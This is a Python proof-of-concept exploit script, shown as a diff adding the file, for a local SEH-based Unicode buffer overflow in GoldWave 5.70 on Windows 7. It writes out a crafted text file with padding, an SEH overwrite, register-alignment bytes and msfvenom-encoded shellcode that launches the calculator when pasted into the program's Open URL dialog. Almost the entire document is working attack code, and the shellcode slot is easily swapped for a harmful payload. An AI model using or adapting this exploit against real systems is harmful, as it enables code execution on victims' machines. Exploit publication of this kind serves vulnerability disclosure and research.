@@ -1,0 +1,68 @@
+#!/usr/bin/python
+
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title:  GoldWave 5.70 - Local Buffer Overflow (SEH Unicode)
+# Date: 04-05-2018
+# Vulnerable Software: GoldWave 5.70
+# Vendor Homepage: https://www.goldwave.com/
+# Version: 5.70
+# Software Link: http://goldwave.com//downloads/gwave570.exe
+# Tested Windows 7 SP1 x86
+#
+#
+# PoC
+# 1. generate goldwave570.txt, copy contents to clipboard
+# 2. open gold wave app
+# 3. select File, Open URL...
+# 4. paste contents from clipboard after 'http://'
+# 5. select OK
+# 6. pop calc
+#
+
+filename="goldwave570.txt"
+
+junk = "\x71"*1019
+
+#popad
+nseh = "\x61\x62"
+
+#0x006d000f : pop ecx # pop ebp # ret  | startnull,unicode,ascii {PAGE_EXECUTE_READ} [GoldWave.exe]
+seh = "\x0f\x6d"
+
+valign = (
+"\x53" 					#push ebx
+"\x47" 					#align
+"\x58" 					#pop eax
+"\x47" 					#align
+"\x05\x16\x11" 	        #add eax,600  
+"\x47"					#align
+"\x2d\x13\x11"	        #sub eax,300
+"\x47"					#align
+"\x50"					#push eax
+"\x47"					#align
+"\xc3"					#retn
+)
+
+#nops to shellcode
+nops = "\x71" * 365
+
+#msfvenom -p windows/exec CMD=calc.exe -e x86/unicode_upper BufferRegister=EAX
+#Payload size: 517 bytes
+calc = (
+"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AA"
+"PAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPM0M0S0DIK501I0C44"
+"K0PP0DKPRLLTKQBMDTKBRO8LOFWOZMV01KOFLOLS13LLBNLO0WQXOLMKQI7K2KB0RQGTKPRN0DK0J"
+"OL4K0LN1CHISOXKQXQ214K0YMPKQJ3DK0IN8K3NZOYTKNT4KM1YFNQKO6L91XOLMM1WW08IP45ZVK"
+"S3MZXOKSMMTRUK4B8TKPXO4M1YCBFDKLLPKDKR8MLM1YC4KKTTKM18PU9PDO4MT1K1KQQR91J0QKO"
+"IP1O1O1J4KN2ZK4MQMRJM14MSUVRM0M0M0PP2HNQTKROSWKO8UWKZPH55R1FQX6FF5WMEMKOXUOLL"
+"F3LKZE0KKYPRUM5GKOWMCCBRO2JM023KOYE1S1QRLBCNNRERX1UM0AA")
+
+fill = "\x71"* 5000
+
+buffer = junk + nseh + seh + valign + nops + calc + fill
+  
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
